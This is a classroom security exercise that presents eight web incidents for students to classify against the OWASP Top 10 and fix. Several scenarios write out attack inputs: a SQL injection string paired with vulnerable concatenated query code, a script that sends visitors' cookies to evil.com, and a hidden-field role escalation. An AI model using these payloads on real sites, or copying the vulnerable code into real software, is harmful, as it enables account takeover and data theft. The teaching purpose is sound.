Security Incident Response Challenge

Time: 35-40 minutes | Groups of 2-3 students

Overview

Your team will analyze security incidents, identify vulnerabilities, and recommend fixes.

Activity structure:

  • Review 8 real-world security scenarios
  • Identify which OWASP Top 10 vulnerability each represents
  • Discuss why it's dangerous
  • Propose solutions

Pre-Activity (10 minutes)

Before starting the scenarios:

Visit the OWASP Top 10 website and spend 10 minutes browsing the list.

https://owasp.org/www-project-top-ten/

Familiarize yourself with the 10 vulnerability categories and their names. You don't need to be an expert.

For each scenario, you'll:

  • Identify which OWASP Top 10 vulnerability is demonstrated
  • Discuss why this is dangerous
  • Propose at least one way to fix it

Scenario 1

An e-commerce site allows users to modify prices by changing URL parameters:

https://shop.example.com/checkout?item=laptop&price=999

A user discovers they can change the URL to:

https://shop.example.com/checkout?item=laptop&price=1

And successfully purchases a $999 laptop for $1.

Which OWASP vulnerability is this?
How would you fix it?

Scenario 2

A developer writes code to display user profiles:

user_id = request.GET['id']
query = "SELECT * FROM users WHERE id = " + user_id
results = database.execute(query)

A malicious user visits:

https://site.com/profile?id=1 OR 1=1

And suddenly sees ALL users' data including passwords.

Which OWASP vulnerability is this?
How would you fix it?

Scenario 3

A company launches a new website. Months later, a security researcher discovers:

https://company.com/admin
https://company.com/debug
https://company.com/.git/config

These URLs expose an unsecured admin panel, debug information, and source code that was left accessible during development.

Which OWASP vulnerability is this?
How would you fix it?

Scenario 4

A banking website uses predictable session IDs:

Session ID: user12345_20250929

An attacker guesses another user's session ID and gains access to their account without knowing their password.

Which OWASP vulnerability is this?
How would you fix it?

Scenario 5

A blog allows users to post comments. A malicious user posts:

<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

Now every visitor to that page has their login cookies sent to the attacker.

Which OWASP vulnerability is this?
How would you fix it?

Scenario 6

A web application uses a JavaScript library:

<script src="jquery-1.8.0.min.js"></script>

This version (from 2012) has 15 known security vulnerabilities that attackers actively exploit.

Which OWASP vulnerability is this?
How would you fix it?

Scenario 7

An application's error log contains:

ERROR: Login failed for user admin, password: SuperSecret123!
ERROR: Database connection failed. Connection string: 
  Server=db.internal;User=admin;Password=DbPass789

An attacker who gains access to log files now has multiple passwords.

Which OWASP vulnerability is this?
How would you fix it?

Scenario 8

A regular user discovers that by changing a single form field from:

<input type="hidden" name="role" value="user">

to:

<input type="hidden" name="role" value="admin">

They gain administrator privileges.

Which OWASP vulnerability is this?
How would you fix it?

Wrap-Up (5 minutes)

Discussion Questions:

Which vulnerability surprised you most?
